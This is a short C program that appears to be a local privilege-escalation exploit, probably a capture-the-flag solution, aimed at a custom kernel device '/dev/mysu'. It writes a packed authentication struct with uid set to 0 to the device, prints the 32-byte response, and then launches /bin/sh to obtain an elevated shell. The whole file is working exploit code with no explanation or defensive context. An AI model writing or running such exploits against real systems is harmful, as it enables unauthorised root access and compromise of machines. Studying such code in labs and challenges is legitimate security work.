#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <unistd.h>

#define _DEVICE "/dev/mysu"

struct auth {
  int uid;
  char buffer[28];
} __attribute__((packed, aligned(1)));

int xpl(const char* dev) {
  int fd = open(dev, O_RDWR);
  if (fd < 0)
    return -1;

  struct auth payload;
  payload.uid = 0;
  memset(payload.buffer, 0, 28);
  if (write(fd, &payload, sizeof(struct auth)) < 0)
    return -1;

  char buffer[32];
  read(fd, buffer, 32);
  write(1, buffer, 32);

  close(fd);
  return 0;
}

int main(int argc, char** argv) {
  if (xpl(_DEVICE) < 0)
    return puts("xpl failed!!");

  execve(
    "/bin/sh",
    (char* const []){"/bin/sh", 0},
    NULL
    );
  return 0;

}
